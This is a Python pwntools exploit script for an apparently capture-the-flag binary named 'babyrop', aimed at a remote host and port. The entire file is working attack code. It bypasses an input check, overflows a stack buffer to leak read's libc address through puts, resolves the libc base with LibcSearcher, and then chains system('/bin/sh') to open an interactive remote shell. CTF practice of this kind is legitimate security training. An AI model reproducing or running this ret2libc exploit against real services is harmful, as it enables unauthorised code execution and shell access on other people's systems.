from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

r = remote('183.129.189.60', 10011)
#r = process('./babyrop')
elf = ELF('./babyrop')

puts_plt = 0x080483E0
read_got = elf.got['read']
main = 0x08048592
ret = 0x0804839e

payload = 'A'*(0x2c-0xc) + p32(1717986918)
r.recvuntil("Hello CTFer!")
r.send(payload)

payload = 'A'*(0x10+4) + p32(ret) + p32(puts_plt) + p32(main) +p32(read_got)
r.recvuntil("What is your name?")
#gdb.attach(r)
r.send(payload)

r.recv(1)
read_addr = u32(r.recv(4))
print hex(read_addr)

obj = LibcSearcher("read", read_addr)
base = read_addr - obj.dump('read')
system = obj.dump('system') + base
binsh = obj.dump("str_bin_sh") + base

payload = 'A'*(0x2c-0xc) + p32(1717986918)
r.recvuntil("Hello CTFer!")
r.send(payload)

payload = 'A'*(0x10+4) + p32(ret) + p32(system) + p32(main) +p32(binsh)
r.recvuntil("What is your name?")
#gdb.attach(r)
r.send(payload)



r.interactive()
